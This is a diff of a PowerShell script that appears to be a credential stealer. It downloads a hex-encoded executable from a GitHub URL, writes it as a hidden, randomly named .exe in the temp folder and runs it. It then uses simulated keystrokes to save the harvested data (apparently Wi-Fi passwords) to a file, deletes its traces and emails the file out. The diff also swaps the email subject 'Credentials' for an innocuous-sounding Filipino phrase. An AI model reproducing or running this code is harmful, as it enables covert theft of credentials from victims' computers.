@@ -76,48 +76,52 @@ function Send-ZohoEmail {
 }
 
 # Run WBPV 
-        $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
-        $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
-        Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
+# 1. Download and Prepare
+$url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
+$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")
+Invoke-WebRequest -Uri $url -OutFile $tempPath
 
-        # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
-        $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
-        $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file
+$hexString = Get-Content -Path $tempPath -Raw
+$bytes = [byte[]]::new($hexString.Length / 2)
+for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+    $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
+}
 
-        # Convert the hex string to a byte array
-        $bytes = [byte[]]::new($hexString.Length / 2)
-        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
-            $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
-        }
+# 2. Create Random EXE
+$randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+$tempExePath = Join-Path $env:TEMP "$randName.exe"
+[System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+(Get-Item $tempExePath).Attributes = 'Hidden'
 
-        # Create a temporary file to hold the executable
-        $randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
-        $tempExePath = Join-Path $env:TEMP "$randName.exe"
-        [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
-        (Get-Item $tempExePath).Attributes = 'Hidden'
+# 3. Run and Automate
+$process = Start-Process $tempExePath -PassThru # -PassThru allows us to track it easily
+$outputFilePath = "$env:TEMP\data.txt"
 
-        # $tempExePath = Join-Path $env:TEMP "example.exe"
-        # [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
-        $process = Start-Process $tempExePath # Start the executable
+Start-Sleep -Seconds 2 
+Add-Type -AssemblyName System.Windows.Forms
 
-        #  SAVED DATA 
-        $outputFilePath = "$env:TEMP\data.txt"
-        Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
-        Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
+[System.Windows.Forms.SendKeys]::SendWait("^(a)")
+Start-Sleep -Milliseconds 500
+[System.Windows.Forms.SendKeys]::SendWait("^(s)")
+Start-Sleep -Milliseconds 1000
 
-        # Simulate CTRL+A and then CTRL+S to save the file
-        [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
-        Start-Sleep -Milliseconds 500  # Wait a moment for selection
-        [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
-        Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear
+[System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
+Start-Sleep -Milliseconds 500
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 
-        # Send the output file path and Enter
-        [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
-        Start-Sleep -Milliseconds 500  # Wait for the input
-        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
+Start-Sleep -Seconds 2 # Give it time to write the data.txt
 
-        Start-Sleep -Seconds 1 # Wait a moment for the file to save
-        Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
+# 4. FIXED CLEANUP
+# Stop the specific process we started
+if ($process) {
+    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+}
+
+# Remove the EXE and the downloaded Hex file
+Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
+Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
+
+Write-Host "Process stopped and EXE removed from Disk." -ForegroundColor Cyan
 
 
 ## Ensure TLS 1.2 for modern SMTP servers
@@ -131,7 +135,7 @@ if (Test-Path $outputFilePath) {
 
     if ($null -ne $attachment) {
         $currentDate = Get-Date -Format 'yyyy-MM-dd HH:mm'
-        $subject = "$env:USERNAME: Credentials - $currentDate"
+        $subject = "$env:USERNAME: Ang pag-ani sa bukirin - $currentDate"
         
         try {
             # Send the object inside an array
